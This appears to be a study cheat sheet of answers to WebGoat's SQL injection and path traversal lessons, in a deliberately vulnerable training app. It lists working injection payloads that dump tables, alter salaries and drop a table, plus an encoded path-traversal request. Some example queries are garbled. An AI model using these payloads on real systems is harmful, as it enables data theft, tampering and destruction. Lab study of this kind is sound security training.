# WebGoat SQL Cheathseet

## SQL Injection (Intro)

* Commands for manipulate data: 
    * `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `CREATE`, `ALTER`, `DROP`, `CREATE`, `REVOKE`


* SQL command for retrieve data, important the single quotes
    * `SELECT column FROM table WHERE column = 'value'`
    * WebGoat (A1) Injection - SQL Injection (Intro) 2.
        * `SELECT department FROM Employees WHERE first_name = 'Bob'`


* To update columns
    * `UPDATE table SET columname = 'newvalue' WHERE columname = 'value'`
    * WebGoat (A1) Injection - SQL Injection (Intro) 3.
        * `UPDATE Employees set department = 'Sales' WHERE first_name = 'Tobi'`


* To add column
    * `ALTER TABLE tabla ADD column_name datatype`
    * WebGoat (A1) Injection - SQL Injection (Intro) 4.
        * `ALTER TABLE Employees ADD phone varchar(20)`

* Grant user the right to alter tables
    * `GRANT ALTER TABLE TO operator`
    * WebGoat (A1) Injection - SQL Injection (Intro) 5.
        * `GRANT ALTER TABLE TO UnauthorizedUser`

* SQL Injection
    * `Smith' or '1' = '1`
    * `Smith' or '1' = '1; --`
 

* WebGoat (A1) Injection - SQL Injection (Intro) 9.
    * Internal query:
        * `"SELECT * FROM user_data WHERE first_name='John' AND last_name = '"+lastName+"' ";`
    * Payload:
        * `Smith' or '1'='1`


* WebGoat (A1) Injection - SQL Injection (Intro) 10. Numeric SQL Injection.
    * `Login_count: 1` and `User_id: 1 OR 1=1`
    * Final query: `SELECT * FROM user_data WHERE Login_count = 1 and userid=1 OR 1=1s`


* WebGoat (A1) Injection - SQL Injection (Intro) 11. Compromising confidenciality
    * Internal Query:
        * `SELECT * FROM employees WHERE last_name = '" +name+"' AND auth_tan = '" +auth_than+"1;`
    * Payload:
        * Employee Name: `Smith' OR 1=1;--` 
        * Authentication TAN: `(empty)`


* WebGoat (A1) Injection - SQL Injection (Intro) 12. Compromising Integrity
    * Employee Name: `Smith'; UPDATE Employees set SALARY = '90000' WHERE last_name = 'Smith';-- `
    * Authentication TAN: `(empty)`

* WebGoat (A1) Injection - SQL Injection (Intro) 13. Compromising Availability
    * `l'; DROP TABLE access_log;--`


## SQL Injection (advanced)

 * UNION
    * Combine results of two or more __SELECT__ Statements
    * `SELECT first_name FROM user_system UNION SELECT login_count FROM user_data;`

* JOIN
    * Combine rows from two or more tables, based on a related column
    *   `SELECT * FROM user_data INNER JOIN user_data ON user_data.userid=user_data_tan.user.id;`

* Query chaining
    * `;`

* Comments
    * `/* */`
    * `--, #`

* WebGoat (A1) Injection - SQL Injection (advanced) 3.
    * First way:
        * Name: `a'; SELECT * FROM user_system_data;--`

    * Second way (Padding with Null):
        * Name: `a' UNION SELECT * FROM user_system_data.*,NULL,NULL,NULL from user_system_data;--`


## Path interception

* WebGoat (A1) Injection - PATH TRAVERSAL 5.
    * Watch the requests and RESPONSES, begin to fuzz and hidde special characters
    * `GET /WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret HTTP/1.1`